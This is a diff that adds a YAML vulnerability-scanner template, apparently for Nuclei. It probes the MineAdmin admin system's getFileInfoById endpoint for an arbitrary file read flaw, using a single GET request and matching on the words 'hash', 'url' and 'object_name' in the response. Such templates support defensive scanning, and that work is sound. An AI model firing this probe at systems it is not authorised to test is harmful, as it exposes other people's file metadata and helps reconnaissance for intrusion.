@@ -1,0 +1,25 @@
+id: MineAdmin-getFileInfoById-file
+
+info:
+  name: MineAdmin企业级后台管理系统getFileInfoById任意文件读取漏洞
+  author: MineAdmin
+  severity: medium
+  tags: MineAdmin
+
+http:
+  - raw:
+      - |+
+        GET /system/getFileInfoById?id=43 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"hash"'
+          - '"url"'
+          - '"object_name"'
+        condition: and
